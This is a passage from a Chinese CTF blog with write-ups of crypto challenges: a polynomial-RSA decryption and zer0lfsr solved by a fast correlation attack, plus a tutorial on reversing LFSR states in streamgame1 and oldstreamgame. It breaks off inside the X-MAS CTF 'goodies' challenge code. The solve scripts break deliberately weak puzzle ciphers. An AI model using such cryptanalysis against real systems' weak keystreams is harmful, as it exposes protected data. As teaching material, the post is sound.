Mathematica 给出了结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a36bb49753da5b38.png" alt="image.png"></p><p>两个因式的最高次数是 821 和 1227，那么可以计算 s（参照上面提到的论文）：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cceb2d14f84f2b6a.png" alt="image.png"></p><blockquote><p>s = (2^821-1) * (2^1227-1)</p></blockquote><p>这个 s 类似于一般 RSA 中的 n 的欧拉值（phi），然后就是求逆元 d 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=(<span class="number">2</span>**<span class="number">1227</span><span class="number">-1</span>)*(<span class="number">2</span>**<span class="number">821</span><span class="number">-1</span>)</span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">d = invert(e,s)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span><br></pre></td></tr></table></figure><p>拿到 d 最后就是解密，sage 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line">d = <span class="number">28371355076358206651880108899447906576372266284154280282347957145120170645734899523334978078067679493874344060469168599875633378810644150054152285167807343298071802254581411860744158353096011714907819564399402714709858337654437633205741705120012058022068404602368525225166892620782231104596296684392603977673442420869964883518757302131139464582403543008517510576759631853686083804876647805871645437996963908242523987920166730933950556409136138395339773872530985876082852299816804207673785130661047844641798164979597836577807048385040982943227701240014693785196556609759136982566512240594608088626862145862029373010104</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">c = f.read()</span><br><span class="line"></span><br><span class="line">c_int = int(c.encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">c_poly = P(R.fetch_int(c_int))</span><br><span class="line">m_poly = pow(c_poly, d, n)</span><br><span class="line">m_int = R(m_poly).integer_representation()</span><br><span class="line"><span class="keyword">print</span> hex(m_int)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babyrsa$ sage solve.sage</span><br><span class="line">flag&#123;P1ea5e_k33p_N_as_A_inTegeR~~~~~~&#125;jIƲ▒▒</span><br><span class="line">▒;f▒$!$▒▒w▒u▒▒▒▒=[▒▒z;▒<span class="comment">#6u▒L▒▒:▒Xl▒ژ▒▒H▒M0b▒▒▒</span></span><br><span class="line">▒^▒b▒▒m▒▒▒▒▒d▒9▒▒A▒ ▒   ▒▒!▒</span><br><span class="line">=</span><br><span class="line"> p▒▒▒p▒h▒▒▒&gt;TɖMÔ▒▒▒Rx▒Z▒▒▒▒6▒(▒ar▒/^pa▒▒▒ٌg▒F7X▒▒܃▒▒2▒▒▒▒▒rvKn6▒?:▒B▒▒▒*▒▒y▒▒y</span><br></pre></td></tr></table></figure><h4 id="zer0lfsr"><a href="#zer0lfsr" class="headerlink" title="zer0lfsr"></a>zer0lfsr</h4><p>比赛的时候看到题目就想到了强网杯的 streamgame3，通过多个线性反馈移位寄存器的线性组合来构成一个非线性反馈移位寄存器。首先列一下 x1 x2 x3 对应最后输出的表，发现x1，x2，x3 都有 3/4 的概率与最终输出的结果相同。当时的 streamgame3 每个 LFSR 最多只不过 21 bit，这次的三个 LFSR 都是 48 bit，没法爆破，GG。</p><p>这个题的反馈位（抽头）都只有两个，很少，感觉应该有东西。google 了很多论文发现了当抽头数较少时可以采用<code>快速相关攻击</code>来进行攻击。最经典的是 Meier和Staffelbach提出的算法A和算法B ，但是我没有找到相应的实现脚本… 自己啃论文写脚本写不出，还是太菜了。</p><p>从@iromise 师傅那里要来了快速相关攻击的实现：<a href="http://pubs.cs.uct.ac.za/honsproj/cgi-bin/view/2011/desai.zip/crypto_desai/dl/" target="_blank" rel="noopener">链接</a></p><p>按照 README 安装就好了，需要安装 GNU Scientific Library 。GSL安装参考：<a href="http://www.voidcn.com/article/p-hpwbigec-dd.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-hpwbigec-dd.html</a></p><p>我在安装中使用了 sudo 还是出现了没有权限的错误，把文件夹 chmod 777 一下，make clean 后再重新 make。</p><p>使用：以这道题第一个 lfsr 为例，输入文件格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.75</span><br><span class="line">65536</span><br><span class="line">48</span><br><span class="line">2</span><br><span class="line">23</span><br><span class="line">48</span><br><span class="line">比特流（65536个）</span><br></pre></td></tr></table></figure><p>第一行是之前说的 3/4，第二行是提供的输出比特个数，第三行是 lfsr 状态比特位数，第四行是抽头个数 n，后面 n 行就是抽头的位置，最后一行就是提供的比特流。</p><p>这个题有个坑点，题目输出的 keystream 是 utf-8 编码的。。。我直接 python2 <code>open(&quot;keystream&quot;,&quot;rb&quot;).read()</code>发现竟然长度不是 8192…一脸懵逼</p><p>感觉 python3 的 byte 类型和 utf-8 编码使用起来很难受，可能是没用惯的原因。</p><p>先生成三个输入文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data=open(<span class="string">"keystream"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">data=data.decode()</span><br><span class="line">init=<span class="string">'''0.75</span></span><br><span class="line"><span class="string">65536</span></span><br><span class="line"><span class="string">48</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">stream=<span class="string">""</span>.join([ bin(ord(c))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">open(<span class="string">"init1"</span>,<span class="string">"w"</span>).write(init.format(<span class="number">23</span>,<span class="number">48</span>)+stream)</span><br><span class="line">open(<span class="string">"init2"</span>,<span class="string">"w"</span>).write(init.format(<span class="number">14</span>,<span class="number">48</span>)+stream)</span><br><span class="line">open(<span class="string">"init3"</span>,<span class="string">"w"</span>).write(init.format(<span class="number">42</span>,<span class="number">48</span>)+stream)</span><br></pre></td></tr></table></figure><p>然后使用快速相关攻击还原每个 lfsr 的比特流：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gml@gml-virtual-machine  ~/CTF/fastcorrattack  src/fca ./zer0lfsr/init1 &gt;./zer0lfsr/result1 </span><br><span class="line">gml@gml-virtual-machine  ~/CTF/fastcorrattack  src/fca ./zer0lfsr/init2 &gt;./zer0lfsr/result2</span><br><span class="line">gml@gml-virtual-machine  ~/CTF/fastcorrattack  src/fca ./zer0lfsr/init3 &gt;./zer0lfsr/result3</span><br></pre></td></tr></table></figure><p>这样 result1、result2、result3 中就会还原出每个 lfsr 的比特流。接下来我们还原初始状态，这部分不懂的可以看一下我的<a href="http://mmmmmmlei.cn/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/" target="_blank" rel="noopener">这篇</a>中的2018国赛 oldstreamgame</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">mask1=<span class="number">0b100000000000000000000000010000000000000000000000</span></span><br><span class="line">mask2=<span class="number">0b100000000000000000000000000000000010000000000000</span></span><br><span class="line">mask3=<span class="number">0b100000100000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    str=bin(R)[<span class="number">2</span>:].zfill(<span class="number">48</span>)</span><br><span class="line">    new=str[<span class="number">-1</span>:]+str[:<span class="number">-1</span>]</span><br><span class="line">    new=int(new,<span class="number">2</span>)                    <span class="comment">#R循环右移一位得到new</span></span><br><span class="line">    i = (new &amp; mask) &amp; <span class="number">0xffffffffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R&gt;&gt;<span class="number">1</span> | lastbit&lt;&lt;<span class="number">47</span></span><br><span class="line"></span><br><span class="line">lfsr1=int(<span class="string">"100100011111111010101110010010110100101000110011"</span>,<span class="number">2</span>)</span><br><span class="line">lfsr2=int(<span class="string">"001101101101101111001001101101110000001001000011"</span>,<span class="number">2</span>)</span><br><span class="line">lfsr3=int(<span class="string">"001000101001101100100001101111101011101010100001"</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">    lfsr1=LFSR_inv(lfsr1,mask1)</span><br><span class="line">    lfsr2=LFSR_inv(lfsr2,mask2)</span><br><span class="line">    lfsr3=LFSR_inv(lfsr3,mask3)</span><br><span class="line"></span><br><span class="line">result=<span class="string">b''</span>.join([i.to_bytes(<span class="number">6</span>,<span class="string">'big'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> (lfsr1,lfsr2,lfsr3)])</span><br><span class="line">print(<span class="string">"flag&#123;"</span>+ hashlib.sha256(result).hexdigest()+<span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{b527e2621131134ec22250cfbca75e8c9f5ae4f40370871fd55910927f66a1b4}</p></blockquote><p>此外也可以使用 z3 约束求解，较为简便。参考：</p><p><a href="https://hxp.io/blog/49/0CTF-Quals-2019-zer0lfsr-writeup/" target="_blank" rel="noopener">https://hxp.io/blog/49/0CTF-Quals-2019-zer0lfsr-writeup/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 中的 LFSR</title>
      <link href="/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/"/>
      <url>/2018/12/21/CTF%E4%B8%AD%E7%9A%84LFSR/</url>
      
        <content type="html"><![CDATA[<p>线性反馈移位寄存器（LFSR）在流密码中有广泛的应用，是指给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。LFSR 主要用于生成一串随机的比特流，比特流可用做加密明文的密钥。</p><p>LFSR 基本原理大致就是通过当前状态进行一些线性运算来确定下一状态。不清楚的可以参考<a href="https://zhuanlan.zhihu.com/p/33920501" target="_blank" rel="noopener">这篇文章</a>学习一下流密码和 LFSR 。</p><p>最开始接触 LFSR 是在强网杯的 streamgame，后来密码学课程上比较详细学习了流密码和 LFSR，再到今年国赛初赛中的 oldstream，最近的 X-MAS CTF 中一道密码题我看到了 LFSR 的一些新玩法，总结一下。</p><a id="more"></a><h3 id="2018-强网杯-streamgame1"><a href="#2018-强网杯-streamgame1" class="headerlink" title="2018 强网杯 streamgame1"></a>2018 强网杯 streamgame1</h3><p>看一下题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask    =   <span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"key"</span>,<span class="string">"ab"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>可以发现 flag 是 19 位比特流，作为 LFSR 的初始状态，生成了 96 个比特并写入了 key 中。这里 2**19 时间复杂度并不大，直接采用暴力枚举的方式，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">key=[<span class="number">85</span>,<span class="number">56</span>,<span class="number">247</span>,<span class="number">66</span>,<span class="number">193</span>,<span class="number">13</span>,<span class="number">178</span>,<span class="number">199</span>,<span class="number">237</span>,<span class="number">224</span>,<span class="number">36</span>,<span class="number">58</span>]</span><br><span class="line">mask=<span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">    R=k;</span><br><span class="line">    a=<span class="string">''</span></span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            (k, out) = lfsr(k, mask)</span><br><span class="line">            tmp = (tmp &lt;&lt; <span class="number">1</span>) ^ out</span><br><span class="line">        <span class="keyword">if</span>(key[i]!=tmp):</span><br><span class="line">           judge=<span class="number">0</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(judge==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'flag&#123;'</span>+bin(R)[<span class="number">2</span>:]+<span class="string">'&#125;'</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结果： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1110101100001101011&#125;</span><br></pre></td></tr></table></figure><h3 id="2018-国赛-oldstreamgame"><a href="#2018-国赛-oldstreamgame" class="headerlink" title="2018 国赛 oldstreamgame"></a>2018 国赛 oldstreamgame</h3><p>看一下题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">"flag&#123;xxxxxxxxxxxxxxxx&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"key"</span>,<span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()python</span><br></pre></td></tr></table></figure><p>同样是一个 LFSR，与之前不同的是 flag 是 8 位十六进制，也就是 LFSR 初始状态是 32 bit，这里我们也可以采用暴力枚举的方式，但是更好的方式是分析一下原理。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们仔细分析一下 <code>lfsr</code> 这个函数的作用：</p><p>函数传入 R 和 mask 两个参数，output 由 R 左移一位然后和 0xffffffff 进行了与操作得到，相当于把原来 R 的最高比特位顶掉了，末尾填了一个 0 。i 是由 R 和 mask 进行了与操作，后面的循环主要用于得到 lastbit。</p><p>lastbit 首先为 0， 然后 lastbit 和 i &amp;1 的结果异或，i 右移一位，以此类推，知道 i 为 0，不难分析出 lastbit 实际就是 i 的每个比特位异或得到的。在循环结束后 output 和 lastbit 进行了异或，由于之前 output 的最低比特是 0，所以相当于把 output 的最低位设成了 lastbit。函数返回 output 和 lastbit 返回。</p><p>总结一下 lfsr 这个函数：</p><p><strong>对于传入的 R 和 mask，R 左移一位把最高位顶掉，最低一位由 R &amp; mask 结果的各个比特位异或的结果进行填充。并返回最终结果和最低位。</strong></p><p>可以看到这就是一个典型的线性反馈移位寄存器的实现，初始状态是 flag 的 32 比特位，随后不断顶掉高位，在最后一位填充。可以想象成一个长度为 32 的队列，每一次队列向前移动，最前面（最高位）的出去，后面填充的由前一状态的 32 个比特经过运算决定（具体就是 lastbit 的生成方法）。</p><p>我们看一下 lastbit 的生成方法，R 和 mask 进行与操作，mask 是 <code>0b10100100000010000000100010010100</code>,和 0 进行与操作肯定是 0，所以实际上 R 只有几个比特位起作用，就是 mask 为 1 的那些 bit 位。也就是说 R 的这些位异或得到了 lastbit。</p><p>这个 LFSR 当生成了第一个比特时，flag 最初始的 32 比特最高比特被顶出去了，生成第二个比特时，原始状态的第二高位被顶出去了。我们不妨想一下当生成第 32 个比特结束后，此时的状态就是 flag 最初始的 32 比特完全都被顶出去了。而这 32 个比特我们都已知（程序每次都把 lastbit 记录写进了 key 中）。此时状态的 32 个比特的最低位是由上一状态的 32 比特起作用的那些位异或得到的，而 mask 的最高位是 1，所以也就是上一个状态的最高位参与了异或运算，而上一个状态最高位就是被顶出去的 flag 初始状态的最低一位，此外我们可以得到参与异或运算的其他比特位，那么我们就可以算出初始状态的最低位了。</p><p>用式子来说明，把开始生成第 32 比特的状态比作 x，x[i] 代表从高到低的第几位，那么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastbit = x[1] ^ x[3] ^ x[6] ^ x[13] ^ x[21] ^ x[25] ^ x[28] ^ x[30]</span><br></pre></td></tr></table></figure><p>lastbit 代表生成的第 32 个比特，x[1] 代表<strong>初始状态的最低比特位</strong>，这个式子中只有 x[1] 未知，我们可以计算出 x[1],这样我们就可以通过生成第 32 个比特后的状态还原了生成第 31 个比特后（生成第 32 个比特前）的状态，以此类推，经过 32 次我们可以完全还原到初始状态。</p><p>原理简单来说就是新生成的比特是通过上一个状态的特定比特异或得到，我们可以利用异或性质用生成的比特去还原原来的比特。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>根据思路写出解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    str=bin(R)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    new=str[<span class="number">-1</span>:]+str[:<span class="number">-1</span>]</span><br><span class="line">    new=int(new,<span class="number">2</span>)                    <span class="comment">#R循环右移一位得到new</span></span><br><span class="line">    i = (new &amp; mask) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R&gt;&gt;<span class="number">1</span> | lastbit&lt;&lt;<span class="number">31</span>         <span class="comment">#最高位用lastbit填充</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">data=open(<span class="string">'key'</span>).read()</span><br><span class="line">data=data[:<span class="number">4</span>]</span><br><span class="line">c=libnum.s2n(data)                    <span class="comment">#生成32比特后的状态</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    c=LFSR_inv(c,mask)</span><br><span class="line"><span class="keyword">print</span> hex(c)</span><br></pre></td></tr></table></figure><p>运行得到结果：0x926201d7L</p><p>所以 flag 是</p><blockquote><p>flag{926201d7}</p></blockquote><h3 id="2018-X-MAS-CTF-goodies"><a href="#2018-X-MAS-CTF-goodies" class="headerlink" title="2018 X-MAS CTF goodies"></a>2018 X-MAS CTF goodies</h3><p>这个题算是一个 LFSR 的变形，感觉考的很有趣。看下题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">'flag.txt'</span>).read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRNG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.seed = self.getseed()</span><br><span class="line">        self.iv = int(bin(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">0</span>:<span class="number">32</span>], <span class="number">2</span>)</span><br><span class="line">        self.key = int(bin(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">32</span>:<span class="number">64</span>], <span class="number">2</span>)</span><br><span class="line">        self.mask = int(bin(self.seed)[<span class="number">2</span>:].zfill(<span class="number">64</span>)[<span class="number">64</span>:<span class="number">96</span>], <span class="number">2</span>)</span><br><span class="line">        self.aux = <span class="number">0</span></span><br><span 